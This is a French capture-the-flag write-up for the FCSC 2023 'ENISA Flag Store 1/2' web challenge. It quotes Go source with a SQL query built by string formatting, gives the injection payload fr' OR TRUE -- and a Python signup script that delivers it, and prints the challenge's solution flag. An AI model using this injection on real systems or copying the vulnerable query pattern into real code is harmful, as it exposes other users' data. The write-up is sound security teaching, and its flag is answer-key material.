---
aliases:
  - fcsc-web-enisa-flag-store-1
tags:
  - go
  - web
  - postgresql
---

# ENISA Flag Store 1/2

> Titre: ENISA Flag Store 1/2  
> Auteur: [Cryptanalyse](https://twitter.com/Cryptanalyse)  
> Difficulté: 1  

## Description

L&rsquo;ENISA a décidé de mettre en place un nouveau service en ligne disponible à l&rsquo;année pour les équipes qui participent à l&rsquo;ECSC. Ce service permet aux joueurs des différentes équipes nationales de se créer des comptes individuels en utilisant des tokens secrets par pays. Une fois le compte créé, les joueurs peuvent voir les flags capturés dans différents CTF.
Le token pour la Team France est `ohnah7bairahPh5oon7naqu1caib8euh`.
Pour cette première épreuve, on vous met au défi d&rsquo;aller voler un flag FCSC{...} à l&rsquo;équipe suisse :-)
Note : Les flags au format FAKE{...} que vous pourrez trouver ne sont pas à soumettre.
Cette épreuve a été découpée en deux parties :
ENISA Flag Store 1/2. ENISA Flag Store 2/2. 
## Objectif

Obtenir l'accès aux flags de la team suisse.
## Analyse

À première vue, le site semble simple. Une page de connexion et d'enregistrement de compte. Je me connecte donc en utilisant les identifiants `user` et `password` ainsi que le token fourni `ohnah7bairahPh5oon7naqu1caib8euh`.

![[./images/flag_store.png]]

On y aperçoit les différents flags au format `FAKE{...}`, donc rien d'intéressant. On se penche alors sur le code source fourni.

Dans la fonction `main`, on apprend que l'endpoint `flag` est servi par la fonction `endpoint_flags`

```go
	mux.HandleFunc("/login", endpoint_login)
	mux.HandleFunc("/signup", endpoint_signup)
	mux.HandleFunc("/logout", endpoint_logout)
	mux.HandleFunc("/flags", endpoint_flags)
```

Voici la fonction `endpoint_flags`

```go
func endpoint_flags(w http.ResponseWriter, r *http.Request) {

	if checkAuth(w, r) {
		var user User
		session, _ := store.Get(r, "auth")
		user.Username = session.Values["username"].(string)
		user.Country = session.Values["country"].(string)
		show_flags(w, r, user)

	} else {
		error := r.URL.Query().Get("error")
		show_index(w, r, error)
	}
}
```


Tout d'abord, elle vérifie que l'utilisateur soit bien authentifié, puis elle appelle la fonction `show_flags` ci-contre.

```go
func show_flags(w http.ResponseWriter, r *http.Request, user User) {

	tmpl, err := template.New("").ParseFiles("views/base.html",
		"views/flags.html")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	data, err := getData(user)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	content := map[string]interface{}{}
	content["User"] = user
	content["Data"] = data

	var buf bytes.Buffer
	err = tmpl.ExecuteTemplate(&buf, "base", content)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=UTF-8")
	buf.WriteTo(w)
}
```

À première vue, la fonction parait simplement rendre le template contenant les flags. Les flags sont obtenus par l'appel de la fonction `getData`

```go
func getData(user User) (
	[]Flag,
	error,
) {
	var flags []Flag

	req := fmt.Sprintf(`SELECT ctf, challenge, flag, points
                        FROM flags WHERE country = '%s';`, user.Country)
	rows, err := db.Query(req)
	if err != nil {
		return flags, err
	}
	defer rows.Close()

	for rows.Next() {
		var flag Flag
		err = rows.Scan(&flag.CTF, &flag.Challenge, &flag.Flag, &flag.Points)
		if err != nil {
			return flags, err
		}
		flags = append(flags, flag)
	}
	if err = rows.Err(); err != nil {
		return flags, err
	}

	return flags, nil
}
```


On s'aperçoit alors de la requête SQL effectuée par cette fonction.

```sql
SELECT ctf, challenge, flag, points FROM flags WHERE country = '%s'
```

Ainsi que de la potentielle SQLi ici. En effet, cette requête récupère les flags uniquement pour le pays de l'utilisateur. Or, si le pays de l'utilisateur correspond à quelque chose comme :

```sql
fr' OR TRUE --
```

Alors, tous les pays seront affichés.

Cependant, la page de création de compte nous permets de choisir le pays seulement à partir de choix pre-faits.

![[./images/signup.png]]


On regrde alors la fonction `endpoint_signup`

```go
func endpoint_signup(w http.ResponseWriter, r *http.Request) {

	if checkAuth(w, r) {
		http.Redirect(w, r, "/", http.StatusSeeOther)
	}

	if r.Method == "GET" {
		error := r.URL.Query().Get("error")
		show_signup(w, r, error)

	} else if r.Method == "POST" {

		if err := r.ParseForm(); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		username := r.FormValue("username")
		password := r.FormValue("password")
		token := r.FormValue("token")
		country := r.FormValue("country")

		if country == "" {
			http.Redirect(w, r, "/signup?error=1", http.StatusSeeOther)
			return
		}

		if CheckToken(country, token) == false {
			http.Redirect(w, r, "/signup?error=2", http.StatusSeeOther)
			return
		}

		err := RegisterLoginPassword(username, password, country)
		if err != nil {
			if errors.Is(err, ErrUserAlreadyExist) {
				http.Redirect(w, r, "/signup?error=3", http.StatusSeeOther)
			} else if errors.Is(err, ErrFieldTooLong) {
				http.Redirect(w, r, "/signup?error=4", http.StatusSeeOther)
			} else {
				http.Redirect(w, r, "/signup?error=5", http.StatusSeeOther)
			}
			return
		}

		http.Redirect(w, r, "/", http.StatusSeeOther)
	}
}
```


Et on découvre qu'elle attend les champs `username`, `password`, `token` et `country` en tant que "form data". En capturant les requêtes, faites par la machine au moment de l'enregistrement, on apprend que les pays doivent être sous la forme de codes [ISO 3166](https://en.wikipedia.org/wiki/List_of_ISO_3166_country_codes). Dans notre cas, la France correspond à `fr` et la Suisse `ch`.

J'écris alors le petit script Python pour gérer la création de compte:

```python
import requests

# Configuration
URL = "http://localhost:8000"


def signup(username: str, password: str, token: str, country: str):
    return requests.post(
        f"{URL}/signup",
        data={
            "username": username,
            "password": password,
            "token": token,
            "country": country,
        },
    )


def main():
    print(
        "Hackropole - https://hackropole.fr/fr/challenges/web/fcsc2023-web-enisa-flag-store-1/"
    )

    username = input("username> ")
    password = input("password> ")
    token = input("token> ")
    country = input("country> ")

    print("[*] Signing up...")
    r = signup(username, password, token, country)
    print(f"Signup status: {r.status_code}")

    print("Done working. Goodbye!")
    exit(1)


main()
```

En créant un compte utilisateur quelconque avec comme `country` la SQLi vue plus tôt 

```sql
fr' OR TRUE --
```

Et en se connectant, on découvre le flag du CTF `FCSC 2023 REAL FIRST FLAG`.

## Flag

FCSC{fad3a47d8ded28565aa2f68f6e2dbc37343881ba67fe39c5999a0102c387c34b}

## Payloads

- [postgresql_injection](../../../payloads/web/postgresql_injection.md)